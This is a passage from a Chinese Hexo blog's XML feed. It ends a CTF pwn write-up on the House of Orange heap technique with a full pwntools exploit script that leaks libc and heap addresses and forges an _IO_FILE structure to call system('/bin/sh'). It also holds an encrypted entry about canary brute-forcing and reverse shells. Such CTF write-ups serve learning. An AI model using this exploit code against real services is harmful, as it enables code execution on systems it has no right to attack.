class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/home/hacker/Desktop/buu64-libc-2.23.so&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice : &#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Length of name :&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Name :&#x27;</span>,content)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Price of Orange:&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Color of Orange:&#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice : &#x27;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Length of name :&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Name:&#x27;</span>,content)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Price of Orange:&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Color of Orange:&#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;4.show\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice : &#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    add(<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    edit(<span class="number">0x40</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x21</span>)+p64(<span class="number">0x0000002000000001</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0xfa1</span>))</span><br><span class="line">    add(<span class="number">0x1000</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">    </span><br><span class="line">    add(<span class="number">0x400</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">    show()</span><br><span class="line">    leak_libc=recv_libc()</span><br><span class="line">    libc_base=leak_libc-<span class="number">0x3c5188</span></span><br><span class="line">    log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">    io_list_all=libc_base+libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">    sys_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    edit(<span class="number">0x20</span>,<span class="string">&#x27;e&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">    </span><br><span class="line">    show()</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;e&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">    leak_heap=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    log_addr(<span class="string">&#x27;leak_heap&#x27;</span>)</span><br><span class="line">    <span class="comment">#debug(p,&#x27;pie&#x27;,d_e,d_a,d_s)</span></span><br><span class="line">    payload=<span class="string">b&#x27;f&#x27;</span>*<span class="number">0x400</span></span><br><span class="line">    payload+=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">    payload+=p64(sys_addr)+p64(<span class="number">0</span>)</span><br><span class="line">    payload+=<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0x61</span>) <span class="comment">#old top chunk prev_size &amp; size 同时也是fake file的_flags字段</span></span><br><span class="line">    payload+=p64(<span class="number">0</span>)+p64(io_list_all-<span class="number">0x10</span>) <span class="comment">#old top chunk fd &amp; bk</span></span><br><span class="line">    payload+=p64(<span class="number">0</span>)+p64(<span class="number">1</span>)<span class="comment">#_IO_write_base &amp; _IO_write_ptr</span></span><br><span class="line">    payload+=p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">    payload+=p64(leak_heap+<span class="number">0x430</span>)<span class="comment">#chain</span></span><br><span class="line">    payload+=p64(<span class="number">0</span>)*<span class="number">13</span></span><br><span class="line">    payload+=p64(leak_heap+<span class="number">0x508</span>)</span><br><span class="line">    payload+=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(sys_addr)</span><br><span class="line">    edit(<span class="number">0x1000</span>,payload)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice : &#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.interactive()</span><br><span class="line">pwn()</span><br></pre></td></tr></table></figure><p><img src="../img/image-20221007234548743.png" alt="image-20221007234548743"></p><h2 id="参考文章：">参考文章：</h2><p><a href="https://www.anquanke.com/post/id/218887#h3-5">House of orange - 安全客，安全资讯平台 (anquanke.com)</a></p><p><a href="https://blog.csdn.net/qq_45595732/article/details/110173579">(41条消息) FSOP_TTYflag的博客-CSDN博客</a></p><p>[]<a href="https://bbs.pediy.com/thread-272098.htm#msg_header_h3_16">原创] CTF 中 glibc堆利用 及 IO_FILE 总结-Pwn-看雪论坛-安全社区|安全招聘|bbs.pediy.com</a></p><p><a href="https://www.cnblogs.com/LynneHuan/p/14696780.html#houseoforange_hitcon_2016">houseoforange_hitcon_2016 - LynneHuan - 博客园 (cnblogs.com)</a></p><p><a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/house-of-orange/">House of Orange - CTF Wiki (ctf-wiki.org)</a></p>]]></content>
      
      
      <categories>
          
          <category> 学习总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> FSOP </tag>
            
            <tag> house of orange </tag>
            
            <tag> unsorted bin attack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>爆破canary+反弹shell</title>
      <link href="/posts/3eb93c75.html"/>
      <url>/posts/3eb93c75.html</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="d0ef2816a1c4f2a0b2146463ddde94f320d5b365dda1ba27caa6336eefc023cc">0e96a196e04ab582d32680aaeaf05fdc0ff4581cd2e016adf497a33e0f0f5a401e613038619dbf66d848ad22bd4a7df73fae2f2c34aef9c0faea23d6f111b4826094a900f6134226fd5a4a776d58de29322fa15128bccc61aa0ac57c3e7a1da7f9ec8871c044a8c58b7bcd0649793bbb5d668e2d84534f103b2984746b540acbee9a06151abc945fd5af648586bdb4f2032be53e69efec6386a2b15d99fbf182e9f103827df3e52f6560f141b8a2ac38ec828fa655fce919492bd71a9cf1f4e786eba8b84c379c6e3c2e2fa8b0e946bcaaee7b0219dae7611d0b9fe85a472e6d9938ba48a9e874c5258df661d483781f48ee629645f4606ab349c58c6c6a5bd747b92337f9262576be312d446b314eb5eff0d0fd33959e7f2393f28f3bfe9f4a6071a6998ab55af595acfba3735bc8cd09e3b6c3acb7abc1fc03bfd601be08297607fdd6c5cda8f8132bd40d2b345a584ca61ee13e0e4516993ef85dc6acc64ef1156283343a9cde6dd9102a8e18494a4f11dc86f14b6f239f0e8d85425741b6764870ddfb6aa283ac4a3b705459ac3e97135b021d41f03a175aa3daa43084b2ae37be5c56dd935676e4dd0f810a01ef7ebff94423fe38016bed678ad9203e8b4954b30dcd2c7fc362dfb32993a4176307453a74a932a83d369a99fa03f9eea137f7e892ff5124064ab6e99ce22dad6a66ec0420e3a5a52d0567052253e22e6834f3164b2d1e3c44c3bb742da909329743910c4b4bf4439d77e16efcd7a8c49bdeaab090045e9c2aac0ad140a2bef74d0d5bb54c91f5d4777bbdc9652d4bfb11dc97f82c1893e58b3893cd606ae2631678932dbb0a37c4370c3372b9dfad36396d09ee1d6a471c66ba4f08de94aa0b32c06d2f4459411955bcadcc2351a557e718eb90e90de6c86ccbdb8b58fcd6e1584f728abfe02c0d2647dae7aed965fac39284cc18749312d3e9222512669fd25657d261e4ab6121b674b9ca320cab42196e2ea5cd2bad6f04bc56a67fe2322c0da7474e932662afcaa748258cfa2016d724a2d1c37da3dca7f871b08f94444a17be8f38053127da0031776dfab2d1303e4bdd68adf52e0cd9aad6ad34dac74d74170e184dea4a8e4c0708f454055e97766d99d4f1bad65d9650dfee7c55288cb51c5e039cb95b40ff9f301fdb0e7752d266e3931eee320e359f32fc518bdef87e8da72e5ec8cbed71b470025446d0f8342213b3b136a13bd72b6c69befd0a3878a4e5b9aaea7e2e8df53c52df5527727dfca75b43b86d47546a56c4177b029bd1df63b8077004c8651dac68552400826afe8031dd71b8f0b6bcea948f0ba07cad8fbd0c0e424a5411a817f4373552b6278c2a9900f87ed05da470bd4558d3adf16077cfe871c68cdbf9c6174d1c386558f141bac7d412c7175d1eb0748398d41cea1e46b166767eecaeaecfd920f5a184e95d7633ce84d456d0057e38716f5bb28c109f3ab29917ae38962ed988c2c57849df2a91a355eb6eb718ef041a9b1709152b89fda8b2ce8061f2d65a96acf9c113a8a6d92abefd2fb8e74a663a00f3ca0ef8bf9b52d1b1985bc2e4a8044c72571d662462fefdeb15a5be8be6431be3c9119a68a7b6a137d39464b49ce3b1827ac1fe701e44c391ab36c9800a96a6a4e9f4b246925d4bf9514546e15790e3dbdcd2e4f0ef0b11978afdfb3a2ec2bcc17de1186e2272596877623b069acbf0869735798247773cdfb9e309ba5ae8760a9145c6c51d8d091d8011b09695ec447f1e2564f85f52dcd45d65870151fd331a2b29a54b57134efdf0c76d6f77e723a042fb3882036f0b94573ef65362f0087c96a56c5b86c708910e937e9485b3a94135ab55f2d243287e9b9b0e791d92d33c7ae4e03e2dc99349469848a31b9f1781dbbaf0298c65cac791dc81f3e55787efa003bb0b09575cc3f540a5a2302bd437a2c4da10161c250c8ac84ad3378ed9cbb9a6276421a582e709d60f09864ea97f78437eec15a6b0dfe0024cfbe0b0657c262896789564649d7a5f1aed38865361eae8e6e154afc8a389e3498b9c893fa5e6be122542348e04e41c0810e2c765826b8535580426e731c76fd843f9c3941c9b89560f310e0a17b046bf0bc7664c42c561f7f799b0ad28b333408cac53685998ff1209ec62bdebe0203d94985244613c35ab620f703de77ebf31f1fe969697a8781d0c59898ddcc9a4badf6ce59be1deb74310df6b5797cd47977d68dfe033b110a9537f0c9c03a8a5c241b1dac75f313a5cd66ca6b5acced53a79230d2659140955743afa3869645013e26119252ebe58e03cc47d2d46ac9e350d41ed65a93975c12aa845b18ccaa61a15753d8f45e94c1a8db860f0c37450347e16a76e73dafb019b23b9c609b3c32591950971a1cd19ad96ec2ebf993fd28597883440e3013626d2b47f8584d2d403da613f29fca78a4c6e73365c05bad003f34e1daae99a8c6a1cbe3c060fc0a47d3ad40839e2aa3919a5ad692850c024c25a1ddafd592f9316a28cd77b489f27b3b2fd500328a3529d909f7422d06378bba5a5caf6cc9e91e18dd4afa02f60def84035f07d98d1d0eab20d3a6be05caa3cf95ed05c7c0f865340844c83b8634033731a09a40432f70b7de330687402d628ea6667bbc68672f68cad4c93a5c7b5016167231b0d9fc5bbdf6f31562a810924ba4127cdf32c664780444c5ec4682f0c169a00c8e1c9985a7ebb8c381d440a769faed4134dc62ee035695cf9e61003228cf58f7ce9f79af8f1cfcc4c51d0b2afb17a14219ae81fbea26ecad70406f4eb28e4d920869319128cc870735595916d3102e9f02868f9670366858fc8a23d756a98b53eb99f137d47b61db0026a9d7c87934882a7c2403689d81dd8aa2557ea675c1f613ab8255c2794a497126d334194dbfc9e19d71f3158cdec07a304ec9294b80306189712edfdeaeee03021f100a5292247d528f9aebd78250a6aa48b6dcac87a06ff60175f6c75eca5d0839510513d8035a579b8bfdc7795be0352f7f7fa59a4d7042839bf06da5cdbceefe48fe96a64a0629e6f8b787d6f31075146361cbd98cb164f7f5d69843e58d03ea881d7d9447a17fd53bc5d9881c9f91dc40c9f8ed56cb3fb913d2d06c00bf21f639a9f4cd85ad816bc164b589464f2b5e25484230b6ee21f261dfacf87478c68c90b9338e677239531ea8ee839e5975fd49ee3b87b030e352de7d893ccdf1611f2a001f1dbe3c62429e3cd1b92910d16feba75c51e5d8dc5d064046396900487cf0952035f70fe15977a7d1506a7cac9b9446a85fcc971ba377204f6bb306a6d8c72ee5da94554d59eb35eeb67ea004a49a7a08a9b930982c8094c5ef6cd019258cfdaf2b906f0f9be7c73c182ad8dc9f3e533593dc40cad62bf6e8a4a2fc66291cbe280d7ff9737c014d2fa315388231546c7f561bc87e7f4824e9fde81676cc99cf13981f111bd329f739fa35f4d36544680cd59d512c06c369e1f4bbceb380ffe42f87b252520fee543590fd41dcaa76b68ffbf86948ffa59ae5fd97c3180079c5c518c4557d19721305496bbe631b101e8fddec934f2ab98ce7d0de9fec4aa63af0706ca0b82bbf0a402790b70db267fbc24cd160decab1506aeaeebda8f06ddcb63bc8cac01ee870602955fd537b7b0c0c7869e8526da0e0a956afbce37de525e85605226dcdd5d17d05c412d8d8856c70b40d43c836aa4249ac92d3a9ffcc89178332928ca4b885141c829216f46625479ffbfc0c4cea31f15b8e6bb6ff745ff29a729e8d7555bb5cd23fd0ffe75ffb3961f74fe3ecb4b2c9bf5e56e32a7429b6ea877908cde249850f025c46e306d993c45d96dd1bc35fb1f96f79c16d9279802361c0a581c930a376d81b523784819f309c85e8e4bc2c45b04a21555d6d44d3f74de2c5123d0deb820397104eb0caa1f9f7064e92584574041d9922021c27353f8701eb45685c81a5c4cfc96fa5af89fba52ba7cb5d58f9449ba8272a303bb694ae7e53ab8498198b8f505ef57ba5b6ca4787c6cf792cff5e2699536085a8fba927f88f446ad988c71667aade310a6feabd42f7f19530a8025608719e3035bc84258a7ae07edd615e0b450ddd946a286f896e58e6bd229e168d0ce83c0f5324c881dcfa51d8e65a5efe65822a8105ff8b63a7206356dca4ef37af96038439453672a69479bba2c963ed5864c62305ca846ca1ab6add310812cdefb4d10acd222e03062e86183b7fec893d7c021abb88327367806f62f4e7e508d47b3b0c3d82fb2b78df8e07536cdb6c6af5944005f62bea24602d5764361325ed5d87511be7b245a7f008a4678e10ebc8ed684d5d9795b7279dbc67d96c4395df9edced6d8c5f0005e7987ca48e58117025538ec901eea475bbec4d30314132045597ea75f79b5a526cd1f0bc59db3db5dccc63bc895803acb38f4a9d8375fee23d9470e9a2f32c577e72f9557e5a62452c112e2f0e6c1f604a5ad5420159fc74b37966ec80c139211215e69c52ca140670edfa4f00af5c79922344d600bdd58d8dde2e1f7b9eb91bcd31fc6f088a24b3a3dd02ac6af85102cb1895ba99592b2462c88f4d66a855788b1c9c6bfe584a2f169d629700cd6cc2bf4756849a2879a712e307141f25e8665e35a62d05cf2833976ebceab49edc8b66b26e34bf2e20832f4d6354a765f5edf3b052faa31c704e6c7f6cd8eb864e04bab35309751137d510ce361acc88c41a9a51cb70baf077a49c26d00b1c8795c9f3d1044d79605825ddd5776e2d8995ff4921162784747c0d19a031ebe7f09b9b658fdf6d5aff742f865d57cf84352ce498612de5b556fae28fbf206f199e7ddf1910bdfea42d56560c9c0c795b9a83b531b2212028b3022a6abfb23a1808413ad73f7cd7fdbee69d5ce1006875135097a757a61a96014daac7ef13306f92ad685623a72d4580b6f3361f493619a927d096ab7868fe262cce37b85bca3939669f327bb2ca56b2a774cd836586f5e448bdef3fcd492a73c64adaef950bfe0b2320b38399f02d36398fb5a90255394703552b7e64c3f0a24e4a7c18c128bbb6ce0016f8e9b609bca0767017edbdebaf77ee57d88c2dc398db618e345a67bb90e7bd16a97ddce336fe4332881797632f0ba82e0c813a28913593bc588c61bde740d55efdfd562f91c47c4e076ba2503407a9758ea0d03952af88a9e6178e4aef48f4b92bd55f48a024ac30e00dac94279d3bbe2e3b74eb9fb9cded6e79c5af3699ec6d904399befa5f42a8468a6a91ceea07a7687be5eed3b1446621cfabf172a7054ce4e2af7c1b63148b82c02e4ef7e3c8427c6f617a25960201c32d802308ba93e9220e4afdb0b2d0a8c7ddfca0691a32f64307b8c8fc6b2cacf9ec522b8de37da7678e2bd7af44c797b89823dcce142efb738428245eab4e11a75bec4be604bef2104266af6d50bdf7a4fb4581ca451ae00acdfa3aba2acf60b3fad1fd937642868128c26db494df9ac3087748ec7bd9424555cd0931eddd7ebd5c57ddeb3a0a14ccd2455382767727be76a449148a7099e469873f220ce28eba3d9f170a91205c7c5f68e47238942fab791fb96ceccf77df6bbc7fc32f1c13768b01fa83609dd78868b757195c23d105a88fd4e3b6a7e328ea0b6a0cfe0f204c55f0a8d486cb493e5419fb3ea37d89af655ffb5741c7f49f168ac4d60e219221e850a5c02a0fcd2fc30895cb0b2db9b2d2dff88fcad532995dbd7f2f8d6db389b14894b7ce0a42e233b287aa38d37af398952c5f2a90b6a0c5b32af7904d5c204da962b257b395994d99ede120cb2790340abe060e55f5a6b45afcccbb5dfb7274a76a4ccd648ed5149db28bf8c7fe8986b51a1f1ae0731fbaa2636682f39cf91d7396e4ec04c725136a47ac3f5ac81914459f4d24a7591fb6b51fa99a5291cc4dc55c37971ec05264ca7dc377114020ab42c34f3f91719c6ccbd0335fcc482ed089e6ef585d66fb18e3e72578bb292cc19c51ad56b1619782cf68846c48b433079db96a3da5d24828911f9487bcfc30fae941d7a0ae35096765aca4a28128adebcbea6eadca27e0a59e89b674d305d036c8e3bc71da00ce36f9b864417b651e00403b34c63025b97a98aae74bff465a0cfedc1668e43409e82a0b050eaa02d4877f67662f9b6680eac881d8174730339188be0e402c49478909c8f629c368fb9438fa58d441880e6626de8fdcf111d0a26823db33a8a275e285f0f975777299efc1a543869c9b2eb2224f822e272f3477ab1d31200fbccdbc5d85f6241cd6894835bada76995eae555a19ceb2fa54bedbe4980bf4dd84c10d08a90a842a7402811bfd1d75063d9970ff20f71ff91816cae6f78b6f8d705b7c7fdcbc2cab9794ad29df9fbcd995119dd16897cb0c736cbb03587cd3093162e80153ddf65f239051f67599e91964cb49177f86868f3f08541e5794d990692a6a96e0989f8b547f1a38e9f7f2652817c13e16d47b2c295fc8668cb823130ea1763d97a603903611aacf047d4fabc46fb51d830088c932dbd5e4e79303447a103487ca727fd56c0dbb2e49fcf1a85cf97c68da4286ca46fc3a0d67092af04c86e4f80334c29877cb6ddd336ec7dab1261b99a66392e936d109246de85633fa1df6f76e28f0f1f80fc6a223c0a0a4da4edbc70fcdbe1d45761aa3a9a245406ce1ba000e52bf955034b0e29644488e92a7a15eaeb6eb46482ebb6c73bbe48d7fd12979ada5b9d0d1814eb20fe10b7a72fb91227b1ea67550c2d82f6e183bc40c46dff28b2a7c5cb26c090c15e4d9e5af32191d34f4321ecd37cbaeda691dcb7d19b09f2617d0daa51a60f7b0551f5c96cd5e3fe51ecd46adf01f3c795efb48ebe800f459c294b54900dfb078535fb13d79ea26400cded41b7cb0cdc7e2603fdd69cf88cf90e891861cd1e04fe27c2997e1459c213edc6fb5d9d14b5a1e40a5ec4f81fb2b6c9c4b289b4dbe9eab3cbe916338eb347a498f6813f71f0532791b7a67e2c264a899857c90eadce962b244873144dabcc613f56feb4ec97c9239b89d43b1eb5851870fc7bd5e3dd2221a8f75a8bf5d3299283e894dd0b085735bd080b49c4a8b596f89f3902dbeda2c761814338cae5f10f74e511ceeb81425f7c7d57269f5dfe4c2016eae4aa67a523b72758b5c6f1ee49103e14d298000470900f3e6c16263a97b64e7a07ab4160f5270c9af47948c79e118ad154404e3cdd3b7ebc2d61302e937dc6912b0535457a8b68fd25bda71aa6b3057b63c14e16364631c95fba2c5060ba142897f1bf24056d9b3b10be0078ced17a85e0cdd2896bb0fa2bc025ef5200a4c19e3793ea4c1b23acb80a1cd40d8e5f007e84f0a05d4414e91b3687b629ec1495cf79e2554e50be1c9b4a6af00b6f4a61def0ad92416fe9b401b419350560267d652010238fddb99155970f16b152b210a41e903580bb37240a607141dc179c9d81ed644b2d87377cb0d31578387b5c089e6e669fce5816f5975cdb752fb0bf860f8332253b9cb78c15215bb711a7fa4127d7a07600c8d744af1aa16622bff708e1349a09ef321aa888fa1380f6dfdba7337c0ce98be414e50805370dd929ede9d20c6d49e20e36bf1d1bc11e77f3eb63a57c85d886c90f6fccac3cab5ada7e5c465c4f54de3d9ba78310e8960c340aafe92e4a469b0c8f65d55f56b66a34a61cb482360bf92d4adf52779d06bb7204a43ce378835b8166bf988f90e1ff360df8b3bb9e2b5e8f75fba82b0d151ed5d4a8da426813d45c8fd9effc9f03e9d2b0d16fe2b4bcecddb0805c763725f07cdf4cbcab7192cdd05888e03f71a68e5fb473d53729d6ed8831589dd90456c04c36f9375a325c2168737f40d1c6d85b4b2e6ea37dc1c6b0523dd7a823157fbbcadbef5c23ea86e89ff78f059dc6e821d08b8128a595706c35aa4c3321908a20d269ba5110a40668692a1898f436575ed40ad1f5ec07c339af13bf1e5db1deb48f634cbc92622865d79338db8c5831d6f19d45681484357c1fba9dc2876b04ccfad5df36d8900ce26603e46da51546153efcc1e1775b12c28a28b09e192e5c00fe4658a3ab47d8dfecb1ba88e7b936f7ab556cc8f09e51964bfda8b4dec475066e2ea7cb71b68289a2041860053a57f5aaaebc4736e6b7d40dd9360924eb51533abb237a2c5473e395f567d7451e4956ee87cee83be5f5c3240238b10b88273ce4bb9ae840a11393f10cc41a13d257397f97a297ddbba16940bcbd7e9ba5cc15f69f2e155337d6ba301ed59073ed9d40b0c2180ff919f1efccec4689bc1e7a7fc511bb0ae55c6f511ec10ccf9fedc848d1283e27d804945bad5a02d5a7571828d653f71aca393492391c5accc864922d631f2ba0efcc132ac3991c00d87255d9410fa38b29461b24ba804028b5f22c7e034291cba22d0b812328d3f80352d39f49ef82c7b10d1bd9a57807bfe572f288a0573234ab45a44187a15565d6b2af6d47eaaf112d3a6fa70edefd7ed75598d0e0e9fef005c709b126cc3b6767a78095efc935560f73cf0db5bfa331de5e16c26079e35d3e3277207eed5d7a465ff00822a848d055ad9337757d462da5da81b00df3e6e4c798f597a6888d9779481c1f1a57c35a720a57152dfbc8176e4647019638b198b6011772fa3971360b0b55c23cc1e20606978ac9dbd0f6d24eaf9fda4b58e26a704cea81109edd9dee15b849010cc28b2d68231fabafd7861aa3475cea56fe1091d2144300cbb5c493053819d886172c38b1fb2841485a9c45fc25ea0296aa8aee4b83084b1bbbbdc7f08bfde30eec984bd624957aec25e17243b45ca847e8f82e600b1bb825735f2b405fc68ee7ad72fe13ab439ea7d1b83d629757f4df03cf54c66a2b7950efed1fbc9d2291d5d5c8719c742e1b987131fb1a540e76faf676f5a657de4245e97c5102e4ba774874b2dcd9ab7d9c3a787b6688b33ec9138667cef1c270da9ad8e13cd45ac4ea26324916359f25b5ee27e1e9d862519d74a01b9f1f4543a43e09ec03d11b7afd7818bd1d754cd38c36b536b2bafe82e70f8d63ee38abd80fa9c02e48d7c9fbaeb1f7d7400ba6a095bf82c0ae17af42f577ec75d2d0a52ca2b18b3ef8548aadf21954a04217585e4a5f6923d5b1bc984dcb58d112d1a2a6e8b676c0ed11e2fbdd07fbd2e650fb3277c1ee6852cf71c673a40d8e4b5c628950643bd763109bcf5ae5fcc972aff9f2a1209d126ff9e23166c452c512b19b55eb7e93bb617229edf82eccd20b0312a296a0f48eaa5c27826a40b6a0ac21aa1d0f03d87da93f392f5ea02bd42b2d6dc6f73b142042101c80613f55a09234281af2be9834b29ead73b54e3ec4c3bef77d1fb771df4ff3f3083a0723143c6f85b27612053636aa59fc3c32b6e570e69b4d07ec68066faedd9ce48058d6a686ab2557a0f603fa75d3ce56b762b5c9f4c96b589f6abd55d7c6f9d49141e0c6c73fb89c8ee231e9ffdc09b69e7c19282a81ac75eb870808a7419c92a01016fc8b14983f870b0dcd107fcb04b76a551fb729256aff11b30bcaf04805bd91fe174e535a36a8113258a52c76ad4e08c955b2dcc8e76f6509f712bdaa106a1efaf1bb1352acf7f58a36af0b86c0603dea017a96000abace7d6823cb0f2e013bd1b9b224ed60229cddda862bf8e6f4b4b1e16fd1af55f3824825ed3a34c8904a1495b5a2f0fd6d072166917b2c88e6884385200edf7c023eb6399091b67e5186e0e4793c17df7b923832f3bc1c728a55f40446e62ebf3e5e5eadb5ace5bc520693a3e2663d7779fd8f5a88faf714745d16eb2c18e92ad450a6b60a4a90fef7d5ad71d906aec0e8cee9a641675234b205a62eecf5a7d13a6c1945b15fe0ddcba5737c4abaacc2003bd7f05a9e2ac462c85f9cd14b10c36665f693996f83f78b33ce7b21bf454fb0927c36a6f6e1494c06872e4f2efff64125516ea348e921f132c7bc45b221b618a5f9d8d328e8d1941e47bfae766e1fa1a9beb9569762be968ef2708fa74cd0692ae097bb2e2f47a8f54fa35b38dbdb01aae348310b884e8d86637f5264c229025793a7b4a4d3841d9b8b4cf9f534fe7171bbeeed3a713a9fa22c6952029f2f43d98f9c25ff9c9de2f997dfdb945ce9490c92958c2e4c7e9aa05ee98a5b044bf768bae52dc0a0188e63e02db69708965a9b8645094d87719a3113dbdf223c2f5fcb64a91247f60f446c606c9e6ac3e5ad38573055cc8e5b6163e6ce25801d5b52cb11525aa2788a78277e51420e4ca76be32a0b7031ca12c003a4fa92707d05aba1ac0e1dedae05998a6a55cfdb77193ce0d3a141eff643269ca5207a3a1f6d57f6d836fdab713d53f26ab751f2e5618e070b4c253915743e344630191a4546c5ff610c56822cb7bafb16fe691a8f5f6937ff84d2e6490c7cb075663d0b655ac4781b730cdc128988bba08416ecbd2823ea54cfbc8f4f39193340153f91cf0e6116cb95b62707d95eaf5355359dd96c93e33b8682f6ebb6e3c1724f361c92f8c5a99f610fca7e1b79d7394c4be779a7abafad7160983da0cfe7c72954ac7ffa4775626413a915c1cfe59c46b4af952126d773a3fb194f21c38b3c04c65332c6ee8c318946e7076dddd49b3cbdc8568aa3aad5bb877e043b2ac7b149ea64e2bed3b9ad62e4ec1adbba0188a831efcaf488bb6294eee6f02f7694b13787c8a995b38682de5091ad2d758831cc2090526f2ff8116deaf836497b456dccbcae7c29a8d41706dfb4d336926715f4fbceb28c5078e9071341dd51c0f1bc54bc1ea54eeccbf27aa90448d863c21a8afd2ea8463c1621d959399f5d47363a348bea9c0bdceadbe1bbbba608c5c3281ace3e89f3f882c3250ee5e78f18deffe74074a238ab92544a2bbf0a69b9d07d39ad81663aae9c16b85486681df00ae433f505dd2937d7118ae3d5debaf8e312fadbbf2b12d0a487649480f3fbcbba0ac31e084685e52bf9d11ea63fcfb39e6ac6fbc74793315414e00f4015802fe8a608a570e4d8e417d0826f05495e21b6c560ed4d610e935c5abaf8341e817cf6aa4ec14cc108669fe84a8305c96df46a2654b40ad74cb138e3b7d48425f8c8401f472eec36cadf79528e403dba68bf2f25448d6bf728d55d01f725235f81f4879760439834ff3fe9beca1e86d162da77e157c6113847db38265968f3d55acff4ff0bdd04e8266dbb130f0aacf349042aa5e47f742e0efaac2ed64aa6763dfda1c3a4136c1903feac3cabd0ad2094c99c1daa0da872567b4f23849615503922493354d6eb096bff7ec0d0a3a6f5c83f5c398cef69133632b3662a95289d2b19f80f33eba41f425d4a1f6a3624ee795e95c9755905fe27adf44dbe550ec15ff3927917ae448a3413bc515de42fefb0bb074229212ad103dd10761144f0407f71bf6249c97fb4786cc482228197f6fe34ac8ceb81e74bcde3e3238f95061e931b34e439e271993c1ec703bc3b322b7ddba862408e1647a6e1b2836ea09373f1666074bad94c1c6e49de968ac636f843412c589a205fe8036c1f5376ccf93107c820c0e072d60f2bf405f03c48e89d21debb33cd5a63ec9c6342ba5ff0ae6aefaaeba6e4b8b24410abae43499430ffd999caf37067513b3df204fbe095ed69c185e7810eb4941e38032e0aeb16d2273c905ccc1712132c685308486763ad57b8be1012fce1305a62c376a17ea68453765693913739af8a4f461d40c1610f63e9dc61186f72e16eb3023979f0c9fc393ca7b5ae885fea0244255802374ec54ec0ddabcdd3e80c118a0bd4704df876f6c122b1d583602d2f24e8d4e2b0de4e6e747e1816aa7ddefd9a3119887c5f25e701adbdbb2bfc490e4782b4685c2f3d061ed11271ce5637742754eb22fd211c018507337d3e35fad405818f01c6e9d139ce6fe7b6ccddf4905ecc04b9c4a82bc852f8ed446bdb0dddf7f4aa551b46fd2031fadcc768ca4f438ade5fc7ebbc641aa6d1f850bf60aa1b0fb410ec0df18ebfdbda1b29918cdb48aa47484b8c988350751c918d74408ad8f62552f18a74b223be2a525085540e8a12fd31a22e653c04381439031cd94e4dca4f87cf9f1e8b1ad5f07f83fa40cb13daf1771034fd97a5d7d3ba0e4735036fcf4c053eeec778872fc88b7253a61c3c80f771999ff5648e3afba21eaead98cc8c51459cef43553ab3c1001878bc4e81a4eff7ea4ff81d8906630d35232460ef03f4870865fe2b392c0451007306d71676fcd920169699c21b9f4e652ef030e59f6f41b09e7825d5b6e3cd1984604b754b8912146ae8982ecb06d91ef392a3aedc9a9923b931dd5a1f06b4fc33852513a6b06a0e6a3680063059a5553fc2afc4572cff35568359043157f17679658e10bb8c259bd49bd1345e9ff2bc1bff15c25c7a11e8814a2a1d035b9fc310ea166712b9af9891ed453